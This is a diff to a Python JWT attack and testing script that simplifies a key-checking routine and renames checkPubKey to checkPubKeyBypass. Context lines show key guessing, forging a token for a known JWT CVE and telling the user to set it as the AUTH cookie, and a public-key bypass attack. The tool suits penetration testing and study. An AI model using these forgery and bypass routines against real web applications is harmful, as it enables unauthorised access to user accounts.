@@ -36,20 +36,13 @@ def checkSig(sig, contents):
 			print("[-] {0} is not the correct key".format(key))
 
 def checkSigKid(sig, contents,key_file):
-	#With \n
-	withN = testKey(key_file, sig, contents, headDict)
 	#Without \n
 	withoutN = testKey(key_file.strip('\n'), sig, contents, headDict)
-	if(withN):
+	if(withoutN):
 		if len(key_file) > 25:
 			print("[+] {0} ...(output trimmed) is the CORRECT key!".format(key_file[0:25]))
 		else:
-			print("[+] {0} is the CORRECT key!".format(key_file))
-	elif(withoutN):
-		if len(key_file) > 25:
-			print(r"[+] {0} ...(output trimmed) is the CORRECT key! (WITH \N STRIPPED)".format(key_file[0:25]))
-		else:
-			print(r"[+] {0} is the CORRECT key! (WITH \N STRIPPED)".format(key_file.strip('\n')))
+			print("[+] {0} is the CORRECT key!".format(key_file.strip('\n')))
 	else:
 		if len(key_file) > 25:
 				print("[-] {0} ...(output trimmed) is not the correct key".format(key_file[0:25]))
@@ -125,7 +118,7 @@ def checkCVE(headDict, tok2):
 	print("\nSet this new token as the AUTH cookie, or session/local storage data (as appropriate for the web application).\n(This will only be valid on unpatched implementations of JWT.)")
 	print("\n{0}\n".format(CVEToken))
 
-def checkPubKey(headDict, tok2):
+def checkPubKeyBypass(headDict, tok2):
 	print("\nPlease enter the Public Key filename:")
 	pubKey = input("> ")
 	try:
@@ -244,7 +237,7 @@ def tamperToken(paylDict, headDict):
 	elif selection == 3:
 		jsonDump = json.dumps(paylDict,separators=(",",":"))
 		tok2 = (base64.urlsafe_b64encode(jsonDump.encode('utf-8'))).decode('utf-8').strip("=")
-		checkPubKey(headDict, tok2)
+		checkPubKeyBypass(headDict, tok2)
 		exit(1)
 	if selection == 4:
 		print("\nPlease enter the key filename:")
@@ -353,7 +346,7 @@ if __name__ == '__main__':
 	if selection == 1:
 		checkCVE(headDict, tok2)
 	elif selection == 2:
-		checkPubKey(headDict, tok2)
+		checkPubKeyBypass(headDict, tok2)
 	elif selection == 3:
 		checkSig(sig, contents)
 	elif selection == 4:
